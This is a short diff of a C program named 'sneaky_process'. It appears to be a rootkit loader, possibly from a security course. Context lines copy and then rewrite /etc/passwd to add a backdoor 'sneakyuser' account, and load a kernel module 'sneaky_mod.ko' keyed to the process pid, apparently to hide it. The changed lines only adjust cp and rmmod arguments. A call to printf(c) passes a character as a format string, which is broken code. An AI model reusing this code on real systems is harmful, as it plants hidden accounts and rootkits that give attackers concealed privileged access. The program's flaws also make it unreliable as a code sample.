@@ -6,7 +6,7 @@
 int main(){
     int pid = getpid();
     printf(“sneaky_process pid = %d\n”, pid);
-    system("cp /etc/passwd /tmp");
+    system("cp -f /etc/passwd /tmp");
     system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
     char command[40]="insmod sneaky_mod.ko pid=\"";
     char pidstr[12];
@@ -18,7 +18,7 @@ int main(){
     while((c=getchar())!='q'){
         printf(c);
     }
-    system("rmmod sneaky_mod.ko");
+    system("rmmod sneaky_mod");
     system("cp -f /tmp/passwd /etc");
     return EXIT_SUCCESS;
 }
